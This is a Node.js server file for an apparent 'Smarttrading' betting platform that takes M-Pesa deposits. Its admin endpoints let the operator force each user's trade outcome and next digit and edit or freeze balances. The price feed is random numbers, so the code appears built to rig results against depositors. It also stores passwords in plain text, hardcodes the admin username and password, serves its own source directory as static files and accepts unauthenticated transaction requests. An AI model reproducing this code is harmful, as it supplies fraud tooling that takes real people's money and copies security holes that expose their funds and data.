const express = require('express');
const http = require('http');
const path = require('path');
const mongoose = require('mongoose');
const cors = require('cors');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

// Middleware
app.use(express.json());
app.use(cors());

// Serve static assets directly from root folder
app.use(express.static(__dirname));

// Route for Main Dashboard
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// -------------------------------------------------------------
// DATABASE SCHEMAS
// -------------------------------------------------------------

// User Schema (Identified by Gmail)
const userSchema = new mongoose.Schema({
  email: { type: String, required: true, unique: true },
  password: { type: String, required: true },
  liveBalance: { type: Number, default: 0 },
  demoBalance: { type: Number, default: 10000 },
  isFrozen: { type: Boolean, default: false },
  adminControls: {
    forceOutcome: { type: String, enum: ['NORMAL', 'WIN', 'LOSS'], default: 'NORMAL' },
    forcedNextDigit: { type: Number, default: null }
  },
  createdAt: { type: Date, default: Date.now }
});

// Transaction Schema (M-Pesa Deposits & Withdrawals)
const transactionSchema = new mongoose.Schema({
  userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User', required: true },
  userEmail: { type: String, required: true },
  type: { type: String, enum: ['DEPOSIT', 'WITHDRAWAL'], required: true },
  paymentMethod: { type: String, default: 'MPESA' },
  phoneNumber: { type: String, required: true },
  amount: { type: Number, required: true },
  status: { type: String, enum: ['PENDING', 'PROMPTED', 'COMPLETED', 'REJECTED'], default: 'PENDING' },
  createdAt: { type: Date, default: Date.now }
});

// Global Config Schema
const systemConfigSchema = new mongoose.Schema({
  evenOddPayout: { type: Number, default: 95.2 },
  maintenanceMode: { type: Boolean, default: false }
});

const User = mongoose.model('User', userSchema);
const Transaction = mongoose.model('Transaction', transactionSchema);
const SystemConfig = mongoose.model('SystemConfig', systemConfigSchema);

// -------------------------------------------------------------
// AUTHENTICATION & ADMIN MIDDLEWARE
// -------------------------------------------------------------

const verifyAdmin = (req, res, next) => {
  const { adminuser, adminpass } = req.headers;
  if (adminuser === 'Admin' && adminpass === 'Admin0247') {
    next();
  } else {
    res.status(403).json({ success: false, message: 'Unauthorized: Invalid Admin Credentials' });
  }
};

// Admin Auth Check
app.post('/api/admin/login', (req, res) => {
  const { username, password } = req.body;
  if (username === 'Admin' && password === 'Admin0247') {
    res.json({ success: true, message: 'Authenticated' });
  } else {
    res.status(401).json({ success: false, message: 'Invalid Admin Credentials' });
  }
});

// User Auth API (Login / Register via Gmail)
app.post('/api/auth/register', async (req, res) => {
  const { email, password } = req.body;
  try {
    const existing = await User.findOne({ email });
    if (existing) return res.status(400).json({ success: false, message: 'Email already registered' });

    const user = new User({ email, password });
    await user.save();
    res.json({ success: true, user: { id: user._id, email: user.email, liveBalance: user.liveBalance, demoBalance: user.demoBalance } });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// -------------------------------------------------------------
// USER TRANSACTIONS (M-Pesa Requests)
// -------------------------------------------------------------

// Submit M-Pesa Request
app.post('/api/user/transaction', async (req, res) => {
  const { userId, type, amount, phoneNumber } = req.body;
  try {
    const user = await User.findById(userId);
    if (!user) return res.status(404).json({ success: false, message: 'User not found' });

    if (type === 'WITHDRAWAL' && user.liveBalance < amount) {
      return res.status(400).json({ success: false, message: 'Insufficient live balance' });
    }

    const tx = new Transaction({
      userId: user._id,
      userEmail: user.email,
      type,
      amount,
      phoneNumber
    });
    await tx.save();

    // Notify connected admin via Sockets instantly
    io.emit('NEW_TRANSACTION_REQUEST', tx);

    res.json({ success: true, transaction: tx, message: 'Request submitted successfully.' });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// -------------------------------------------------------------
// ADMIN MANAGEMENT ENDPOINTS
// -------------------------------------------------------------

// Fetch All Registered Users
app.get('/api/admin/users', verifyAdmin, async (req, res) => {
  try {
    const users = await User.find().select('-password').sort({ createdAt: -1 });
    res.json({ success: true, users });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Fetch All Pending & Completed Transactions
app.get('/api/admin/transactions', verifyAdmin, async (req, res) => {
  try {
    const transactions = await Transaction.find().sort({ createdAt: -1 });
    res.json({ success: true, transactions });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Step 1: Admin Prompts M-Pesa Request Manually
app.post('/api/admin/transaction/prompt', verifyAdmin, async (req, res) => {
  const { transactionId } = req.body;
  try {
    const tx = await Transaction.findByIdAndUpdate(transactionId, { status: 'PROMPTED' }, { new: true });
    io.emit('TRANSACTION_UPDATED', tx);
    res.json({ success: true, transaction: tx, message: 'STK Prompt flagged as sent.' });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Step 2: Admin Marks Received/Paid -> Auto Updates User Account Balance
app.post('/api/admin/transaction/approve', verifyAdmin, async (req, res) => {
  const { transactionId } = req.body;
  try {
    const tx = await Transaction.findById(transactionId);
    if (!tx || tx.status === 'COMPLETED') {
      return res.status(400).json({ success: false, message: 'Transaction invalid or already processed' });
    }

    const user = await User.findById(tx.userId);
    if (!user) return res.status(404).json({ success: false, message: 'User not found' });

    // Auto update user balance
    if (tx.type === 'DEPOSIT') {
      user.liveBalance += tx.amount;
    } else if (tx.type === 'WITHDRAWAL') {
      user.liveBalance -= tx.amount;
    }

    tx.status = 'COMPLETED';
    await user.save();
    await tx.save();

    // Broadcast updates
    io.emit('TRANSACTION_UPDATED', tx);
    io.emit('USER_BALANCE_UPDATED', { userId: user._id, liveBalance: user.liveBalance });

    res.json({ success: true, transaction: tx, user });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Admin Control User Wallet & Trade Outcome
app.post('/api/admin/user/update', verifyAdmin, async (req, res) => {
  const { userId, liveBalance, demoBalance, isFrozen, forceOutcome, forcedNextDigit } = req.body;
  try {
    const user = await User.findByIdAndUpdate(userId, {
      liveBalance,
      demoBalance,
      isFrozen,
      'adminControls.forceOutcome': forceOutcome,
      'adminControls.forcedNextDigit': forcedNextDigit !== '' && forcedNextDigit !== undefined ? Number(forcedNextDigit) : null
    }, { new: true });

    io.emit('USER_UPDATED', user);
    res.json({ success: true, user });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// -------------------------------------------------------------
// WEBSOCKET REAL-TIME TICK STREAM
// -------------------------------------------------------------
io.on('connection', (socket) => {
  const tickInterval = setInterval(() => {
    const price = (1440 + Math.random() * 5).toFixed(2);
    const lastDigit = Math.floor(Math.random() * 10);
    socket.emit('TICK_UPDATE', { price, lastDigit, timestamp: Date.now() });
  }, 1000);

  socket.on('disconnect', () => clearInterval(tickInterval));
});

// Fallback SPA Route
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Server Start
const PORT = process.env.PORT || 10000;
const MONGO_URI = process.env.MONGO_URI || 'mongodb://127.0.0.1:27017/smarttrading';

mongoose.connect(MONGO_URI)
  .then(() => console.log('Connected to MongoDB successfully.'))
  .catch(() => console.log('MongoDB Warning: Database connection offline. Config values will use defaults.'));

server.listen(PORT, () => console.log(`Smarttrading Server running on port ${PORT}`));
